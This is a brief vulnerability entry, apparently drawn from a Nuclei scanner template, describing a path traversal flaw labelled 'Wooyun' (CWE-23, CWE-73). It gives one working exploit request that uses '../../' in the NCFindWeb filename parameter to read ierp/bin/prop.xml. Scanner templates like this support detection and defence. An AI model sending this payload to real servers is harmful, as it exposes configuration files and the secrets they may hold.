# Vulnerability: Wooyun - Local File Inclusion
**Classification:** CWE-23,CWE-73
**Source:** Nuclei Template (`wooyun-path-traversal.yaml`)

## Description
Wooyun is vulnerable to local file inclusion.

## Vulnerable Code Pattern / Exploit Payload
```http
GET {{BaseURL}}/NCFindWeb?service=IPreAlertConfigService&filename=../../ierp/bin/prop.xml
```

